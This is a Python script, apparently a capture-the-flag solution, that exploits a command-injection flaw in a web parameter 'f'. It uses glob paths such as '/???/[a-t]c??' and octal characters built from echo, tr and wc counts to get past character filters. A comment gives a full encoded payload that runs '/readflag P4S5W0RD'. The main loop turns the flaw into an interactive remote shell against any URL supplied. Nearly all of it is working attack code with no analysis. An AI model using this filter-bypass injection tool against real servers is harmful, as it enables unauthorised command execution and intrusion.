import sys
import requests

# Solution: /readflag P4S5W0RD
# http://localhost:9090/?f=c|/??a???a?%20$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))$(/???/[a-t]c??%20c|/???/???/t?%20c%20$(/???/[a-t]c??%20/|/???/???/t?%20.-/%20[-])$(/???/[a-t]c??%20ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc|/???/???/[!c]c%20-c))

echo = "/???/[a-t]c??"      # /bin/echo
wc = "/???/???/[!c]c -c"    # /usr/bin/wc -c
tr = "/???/???/t?"          # /usr/bin/tr

def payload(cmd):
    wc_cmd = wc_str(cmd)
    return f"c|{wc_cmd}"

def wc_str(s):
    wstr = ""
    for c in s:
        wchr = wc_chr(c)
        wstr += f"$({wchr})"
    return wstr

# P == `echo c|tr c \120`
def wc_chr(c):
    backslash = f"$({echo} /|{tr} .-/ [-])"
    oct_c = oct(ord(c))[2:]
    woct = wc_oct(oct_c)
    wchr = f"{echo} c|{tr} c {backslash}{woct}"
    return wchr

# 6 == `echo ccccc|wc -c`
def wc_oct(o_str):
    woct = ""
    nchr = 'c' * (int(o_str) - 1)
    woct += f"$({echo} {nchr}|{wc})"
    return woct


if __name__ == "__main__":
    url = sys.argv[1]
    command = ""
    while command != "exit":
        command = input("> ")
        tmp = payload(command)
        r = requests.get(url+"?f="+tmp)
        print(r.text)

